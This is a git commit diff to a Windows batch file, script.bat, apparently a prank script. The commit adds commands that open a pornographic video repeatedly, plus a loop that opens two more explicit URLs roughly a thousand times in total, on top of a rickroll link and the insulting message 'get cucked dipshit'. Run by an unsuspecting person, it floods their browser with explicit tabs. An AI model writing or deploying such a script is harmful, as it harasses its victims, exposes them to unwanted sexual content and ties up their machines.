f561f11caaf293298978069e19e3c4472dee452a
Vixel V Vixel <33169104+Tqcoz@users.noreply.github.com>
2020-06-15 15:46:03 -0400

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,3 +1,12 @@
 start "" "https://www.youtube.com/watch?v=ADl7RK0L_hk"
+start "" "https://www.pornhub.com/view_video.php?viewkey=ph5cc75f6a92f47"
+start "" "https://www.pornhub.com/view_video.php?viewkey=ph5cc75f6a92f47"
+start "" "https://www.pornhub.com/view_video.php?viewkey=ph5cc75f6a92f47"
+start "" "https://www.pornhub.com/view_video.php?viewkey=ph5cc75f6a92f47"
+start "" "https://www.pornhub.com/view_video.php?viewkey=ph5cc75f6a92f47"
+FOR /L %%B IN (2,2,1000) DO (
+  	start "" "https://www.pornhub.com/view_video.php?viewkey=ph5e14cdabad162"
+    start "" "https://www.pornhub.com/view_video.php?viewkey=ph5dcfd5686fc32"
+)
 start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 echo get cucked dipshit
